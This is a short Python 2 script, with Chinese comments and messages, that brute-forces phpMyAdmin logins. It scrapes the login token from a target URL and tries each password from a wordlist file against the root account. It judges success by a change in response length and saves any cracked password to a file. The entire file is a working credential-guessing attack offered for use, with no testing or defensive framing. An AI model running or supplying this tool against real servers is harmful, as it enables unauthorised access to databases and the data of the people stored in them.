#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: CoolCat
# 脚本功能：暴力破解phpMyadmin密码

import requests
import re
import time
n = 0
Content_Length = 0
url = raw_input("URL:")
url = url.replace("\n", "")
url = url.replace("\r", "")
url = url.replace("index.php", "")
res = requests.get(url, timeout=2)
token = re.findall("name=\"token\" value=\"(.*?)\" /><fieldset>", res.text)
token = str(token)
token = token.replace("[u\'", "")
token = token.replace("\']", "")
print("[!]Token:" + token)
try:
    for pwd in open("password.txt"):
        pwd = pwd.replace("\r", "")
        pwd = pwd.replace("\n", "")
        if (res.status_code == 200):
            try:
                session = requests.session()
                fucker = {'pma_username': 'root',
                          'pma_password': pwd,
                          "server": "1",
                          "target": "url.php",
                          'token': token}
                session.post(url, data=fucker)
                url2 = url + '/index.php?target=url.php&token=' + token
                r = session.get(url=url2, timeout=2)
                if (n == 0):
                    Content_Lengthraw = len(r.text)
                    print("[-]初始返回头长度设定为:" + str(len(r.text)) + "\n")
                print "[?]正在验证密码:" + str(pwd)
                Content_Length = len(r.text)
                if (Content_Length == Content_Lengthraw):
                    print("[-]返回头长度为:" + str(Content_Lengthraw) + " 密码错误！")
                else:
                    print("[+]返回头长度为:" + str(Content_Length) + " 密码正确！")
                    coolcat = open("success.txt", "a")
                    coolcat.write(url + "的root密码为:" + str(pwd) + "\n")
                    coolcat.close()
                    exit()
                n = n + 1
            except:
                print("[!]未知错误")
        else:
            print(r.text)
        time.sleep(0)
except:
    print("[!]未知错误")




